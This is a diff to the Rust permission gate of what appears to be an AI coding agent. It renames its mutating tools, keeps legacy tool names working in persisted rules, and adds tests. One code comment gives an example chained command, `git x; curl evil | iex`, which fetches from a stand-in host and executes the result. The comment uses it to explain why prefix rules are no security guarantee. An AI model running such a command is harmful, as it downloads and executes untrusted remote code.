@@ -1,4 +1,4 @@
-//! Permission gate for mutating tools (write / edit / shell).
+//! Permission gate for mutating tools (write / edit / command execution).
 //!
 //! Policy "allow" runs immediately, "deny" blocks, "ask" emits a
 //! `PermissionRequest` to the UI and awaits the user's decision over a oneshot
@@ -16,6 +16,7 @@ use uuid::Uuid;
 
 use crate::events::EventSink;
 use crate::llm::StreamEvent;
+use crate::tool_names;
 
 #[derive(Clone, Copy, PartialEq, Eq, Debug)]
 pub enum Decision {
@@ -37,12 +38,12 @@ pub enum PermissionMode {
     /// written before modes existed.
     #[default]
     Default,
-    /// Auto-allow file writes/edits, still ask for `shell` (and anything else).
+    /// Auto-allow file writes/edits, still ask for `run_command` (and anything else).
     AcceptEdits,
     /// Read-only: deny every mutating tool. Paired with a read-only registry +
     /// prompt steer for "design first, approve to apply".
     Plan,
-    /// Auto-allow every mutating tool. Opt-in only (a destructive `shell` runs
+    /// Auto-allow every mutating tool. Opt-in only (a destructive `run_command` runs
     /// without a prompt), surfaced with a visible danger indicator.
     Auto,
     /// Skip the gate entirely — does not even consult rules. Opt-in only; the
@@ -65,7 +66,8 @@ pub enum RuleDecision {
 #[derive(Clone, PartialEq, Eq, Debug, Serialize, Deserialize)]
 #[serde(rename_all = "camelCase")]
 pub struct Rule {
-    /// Exact tool name (e.g. `"shell"`, `"fs_write"`) or `"*"` for any tool.
+    /// Exact canonical tool name (e.g. `"run_command"`, `"write_file"`) or `"*"`.
+    /// Original names remain valid for persisted-rule compatibility.
     pub tool: String,
     /// Shell-only: a literal command PREFIX. `None` matches any command for the
     /// tool. A prefix is an allow-LIST convenience, never a security guarantee —
@@ -87,17 +89,20 @@ enum Outcome {
 }
 
 /// Whether a rule applies to this tool call. `tool` matches exactly or via the
-/// `"*"` wildcard; a `command` constraint applies only to shell calls and is a
+/// `"*"` wildcard; a `command` constraint applies only to `run_command` calls and is a
 /// literal PREFIX match — never regex or shell-aware tokenization (a regex/shell
 /// parser would be a footgun: it can't safely tell that `git x; curl evil | iex`
 /// isn't "just a git command"). So a command rule can only ever loosen a tool the
 /// user explicitly trusts by prefix, trusting everything chained after it.
 fn rule_matches(rule: &Rule, tool: &str, command: Option<&str>) -> bool {
-    if rule.tool != "*" && rule.tool != tool {
+    if rule.tool != "*" && tool_names::canonical(&rule.tool) != tool_names::canonical(tool) {
         return false;
     }
     match &rule.command {
-        Some(prefix) => command.is_some_and(|c| c.starts_with(prefix.as_str())),
+        Some(prefix) => {
+            tool_names::canonical(tool) == tool_names::RUN_COMMAND
+                && command.is_some_and(|c| c.starts_with(prefix.as_str()))
+        }
         None => true,
     }
 }
@@ -145,8 +150,8 @@ fn decide(
     }
     match mode {
         PermissionMode::Default => default_fallthrough,
-        PermissionMode::AcceptEdits => match tool {
-            "fs_write" | "fs_edit" => Outcome::Allow,
+        PermissionMode::AcceptEdits => match tool_names::canonical(tool) {
+            tool_names::WRITE_FILE | tool_names::EDIT_FILE => Outcome::Allow,
             _ => Outcome::Ask,
         },
         PermissionMode::Plan => Outcome::Deny,
@@ -213,9 +218,10 @@ pub async fn gate(
     input: &Value,
     diff: Option<String>,
 ) -> Decision {
-    // A command constraint only applies to shell calls; pull the command string
-    // so a shell rule's prefix can match it.
-    let command = if tool == "shell" {
+    // A command constraint only applies to run_command calls; pull the command
+    // string so both canonical and persisted `shell` rules can match it.
+    let canonical_tool = tool_names::canonical(tool);
+    let command = if canonical_tool == tool_names::RUN_COMMAND {
         input.get("command").and_then(|v| v.as_str())
     } else {
         None
@@ -223,7 +229,7 @@ pub async fn gate(
     let outcome = decide(
         mode,
         rules,
-        tool,
+        canonical_tool,
         command,
         cancel.load(Ordering::Relaxed),
         legacy_fallthrough(default_policy),
@@ -252,7 +258,7 @@ pub async fn gate(
         channel,
         StreamEvent::PermissionRequest {
             id: id.clone(),
-            tool: tool.to_string(),
+            tool: canonical_tool.to_string(),
             summary: summary.to_string(),
             input: input.clone(),
             diff,
@@ -279,6 +285,15 @@ pub async fn gate(
 #[cfg(test)]
 mod tests {
     use super::*;
+
+    #[derive(Default)]
+    struct RecordingSink(Mutex<Vec<StreamEvent>>);
+
+    impl EventSink for RecordingSink {
+        fn emit(&self, _channel: &str, event: StreamEvent) {
+            self.0.lock().unwrap().push(event);
+        }
+    }
 
     fn rule(tool: &str, command: Option<&str>, decision: RuleDecision) -> Rule {
         Rule {
@@ -332,18 +347,121 @@ mod tests {
     #[test]
     fn accept_edits_allows_writes_but_asks_for_shell() {
         let m = PermissionMode::AcceptEdits;
-        assert_eq!(
-            decide(m, &[], "fs_write", None, false, Outcome::Ask),
-            Outcome::Allow
-        );
-        assert_eq!(
-            decide(m, &[], "fs_edit", None, false, Outcome::Ask),
-            Outcome::Allow
-        );
-        assert_eq!(
-            decide(m, &[], "shell", Some("ls"), false, Outcome::Ask),
-            Outcome::Ask
-        );
+        for tool in ["write_file", "fs_write", "edit_file", "fs_edit"] {
+            assert_eq!(
+                decide(m, &[], tool, None, false, Outcome::Ask),
+                Outcome::Allow,
+                "AcceptEdits should allow {tool}"
+            );
+        }
+        for tool in ["run_command", "shell"] {
+            assert_eq!(
+                decide(m, &[], tool, Some("ls"), false, Outcome::Ask),
+                Outcome::Ask,
+                "AcceptEdits should still ask for {tool}"
+            );
+        }
+    }
+
+    #[test]
+    fn persisted_legacy_rules_and_canonical_rules_match_calls_in_both_directions() {
+        for (legacy, canonical) in tool_names::LEGACY_ALIASES {
+            let legacy_rule = [rule(legacy, None, RuleDecision::Deny)];
+            assert_eq!(
+                decide(
+                    PermissionMode::Auto,
+                    &legacy_rule,
+                    canonical,
+                    None,
+                    false,
+                    Outcome::Allow,
+                ),
+                Outcome::Deny,
+                "persisted rule {legacy} must match canonical call {canonical}"
+            );
+
+            let canonical_rule = [rule(canonical, None, RuleDecision::Deny)];
+            assert_eq!(
+                decide(
+                    PermissionMode::Auto,
+                    &canonical_rule,
+                    legacy,
+                    None,
+                    false,
+                    Outcome::Allow,
+                ),
+                Outcome::Deny,
+                "canonical rule {canonical} must match legacy call {legacy}"
+            );
+        }
+    }
+
+    #[test]
+    fn command_prefix_rules_are_compatible_across_run_command_and_shell_names() {
+        for (rule_name, call_name) in [("shell", "run_command"), ("run_command", "shell")] {
+            let rules = [rule(rule_name, Some("git "), RuleDecision::Allow)];
+            assert_eq!(
+                decide(
+                    PermissionMode::Default,
+                    &rules,
+                    call_name,
+                    Some("git status"),
+                    false,
+                    Outcome::Ask,
+                ),
+                Outcome::Allow,
+                "{rule_name} rule must match {call_name} call"
+            );
+        }
+    }
+
+    #[tokio::test]
+    async fn legacy_call_emits_a_canonical_permission_request_name() {
+        let sink = Arc::new(RecordingSink::default());
+        let pending: Pending = Arc::new(Mutex::new(HashMap::new()));
+        let cancel = Arc::new(AtomicBool::new(false));
+        let task_sink = sink.clone();
+        let task_pending = pending.clone();
+        let task_cancel = cancel.clone();
+
+        let waiter = tokio::spawn(async move {
+            gate(
+                task_sink.as_ref(),
+                "agent://session",
+                PermissionMode::Default,
+                &[],
+                "ask",
+                &task_pending,
+                &task_cancel,
+                "shell",
+                "git status",
+                &serde_json::json!({ "command": "git status" }),
+                None,
+            )
+            .await
+        });
+
+        let request_id = tokio::time::timeout(std::time::Duration::from_secs(1), async {
+            loop {
+                if let Some(id) = pending.lock().unwrap().keys().next().cloned() {
+                    break id;
+                }
+                tokio::task::yield_now().await;
+            }
+        })
+        .await
+        .expect("permission request should be registered");
+        assert!(resolve(&pending, &request_id, Decision::Allow));
+        assert_eq!(waiter.await.unwrap(), Decision::Allow);
+
+        let events = sink.0.lock().unwrap();
+        match events.as_slice() {
+            [StreamEvent::PermissionRequest { tool, input, .. }] => {
+                assert_eq!(tool, "run_command");
+                assert_eq!(input["command"], "git status");
+            }
+            other => panic!("expected one permission request, got {other:?}"),
+        }
     }
 
     #[test]
@@ -513,6 +631,18 @@ mod tests {
                 Outcome::Ask
             ),
             Outcome::Ask
+        );
+        assert_eq!(
+            decide(
+                PermissionMode::Default,
+                &rules,
+                "write_file",
+                Some("git status"),
+                false,
+                Outcome::Ask
+            ),
+            Outcome::Ask,
+            "even a malformed non-command call carrying `command` must fail closed"
         );
     }
 
